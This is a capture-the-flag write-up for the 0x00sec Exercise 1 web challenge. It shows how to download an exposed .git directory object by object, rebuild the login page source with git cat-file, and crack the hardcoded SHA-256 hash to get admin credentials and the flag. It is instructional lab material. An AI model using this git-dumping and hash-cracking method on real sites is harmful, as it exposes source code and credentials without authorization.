@@ -1,0 +1,138 @@
+0x00sec: Exercise 1
+
+https://exercise-1.0x00sec.dev/
+
+From the website source, we're told they have included the .git folder. 
+Unfortunately the folders themselves can't be viewed, but any file inside can still be viewed and downloaded.
+
+Here's the path i personally took:
+1) retrieve the latest commit object 
+
+https://exercise-1.0x00sec.dev/.git/HEAD
+
+> ref: refs/heads/master
+
+https://exercise-1.0x00sec.dev/.git/refs/heads/master
+
+> 05480569507a37df7731115a5888f91b145c189d
+
+https://exercise-1.0x00sec.dev/.git/objects/05/480569507a37df7731115a5888f91b145c189d
+
+> <commit object>
+
+2) replicate the .git directory and run the commands necessary to retrieve any files we consider sensitive. 
+The login page is the most important here, so we'll start by downloading the tree.
+
+git init
+
+<insert the downloaded 480569507a37df7731115a5888f91b145c189d object in our own .git/objects/05/480569507a37df7731115a5888f91b145c189d >
+
+$ git cat-file -p 05480569507a37df7731115a5888f91b145c189d
+tree b63be1fb236a6be035cd8573a585a356d47285fa
+parent c13f81bf0a2f2c0e64a97a316bf3df3ccccea25a
+author pry <pry@Ghostbook-Air.home> 1581195325 +0000
+committer pry <pry@Ghostbook-Air.home> 1581195325 +0000
+
+updated
+
+https://exercise-1.0x00sec.dev/.git/objects/b6/3be1fb236a6be035cd8573a585a356d47285fa
+
+> <tree object>
+
+3) Rinse and repeat. Insert tree into our own git folder, parse tree structure info searching for the hash of whatever file we feel like downloading.
+
+<insert thre tree object in our own objects directory just like before>
+
+$ git cat-file -p b63be1fb236a6be035cd8573a585a356d47285fa
+100644 blob 490df3efe45d6cc67321193204f1649a57a36c83    index.php
+100755 blob bcadc6660ab54fa55190bcaaa5e91df08b34925f    start.sh
+
+start.sh doesn't contain anything important hardcoded, but the actual login page is more interesting.
+
+https://exercise-1.0x00sec.dev/.git/objects/49/0df3efe45d6cc67321193204f1649a57a36c83
+
+<insert the object yadda yadda>
+
+$ git cat-file -p 490df3efe45d6cc67321193204f1649a57a36c83
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Hack this :)</title>
+
+    <link rel="canonical" href="https://getbootstrap.com/docs/4.0/examples/sign-in/">
+
+    <!-- Bootstrap core CSS -->
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="https://getbootstrap.com/docs/4.0/examples/sign-in/signin.css" rel="stylesheet">
+  </head>
+
+  <body class="text-center">
+
+        <?php
+
+        function xor_this($string, $supplied_key) {
+
+    // Let's define our key here
+    $key = ($supplied_key);
+
+    // Our plaintext/ciphertext
+    $text = $string;
+
+    // Our output text
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0; $i<strlen($text); )
+    {
+        for($j=0; ($j<strlen($key) && $i<strlen($text)); $j++,$i++)
+        {
+            $outText .= $text{$i} ^ $key{$j};
+        }
+    }
+    return $outText;
+}
+
+        if (isset($_POST["username"]) && isset($_POST["password"])) {
+                if ($_POST["username"] == "admin" && hash('sha256', $_POST["password"]) == "e83176eaefcc1ae8c4a23dbc73ebcf122f26cfb9ba5c7cf4763e96c1c38a6c6c") {
+                        echo '<h4> '.xor_this(base64_decode("Cl9SEwgSQRVFUA1dAl1dVFkaQF0CWAQUTQ=="), $_POST["password"]).' </h4>';
+                } else {
+                        echo '<h4 class="error"> Incorrect Password :) </h4>';
+                }
+        } else {
+                        echo '
+
+    <form class="form-signin" action="/" method="post">
+    <h3> 0x00sec Exercise #1 </h3>
+      <label for="inputEmail" class="sr-only">Username</label>
+      <input type="text" id="inputEmail" name="username" class="form-control" placeholder="Username" required autofocus>
+      <label for="inputPassword" class="sr-only">Password</label>
+      <input type="password" id="inputPassword" name="password" class="form-control" placeholder="Password" required>
+      <button class="btn btn-lg btn-primary btn-block" type="submit">Login</button>
+    </form>';
+        }
+
+        ?>
+
+  </body>
+  <!-- TODO: -->
+  <!-- * Remove the git directory after publishing -->
+</html>
+
+Now we can try cracking the sha256 hash included in the source. Thankfully Crackstation had it:
+
+e83176eaefcc1ae8c4a23dbc73ebcf122f26cfb9ba5c7cf4763e96c1c38a6c6c	sha256	l33tsupah4x0r
+
+Once we enter our credentials admin:l33tsupah4x0r the flag pops up.
+flag{g1t-dump1ng-i5-c00l}
+
+
+
+
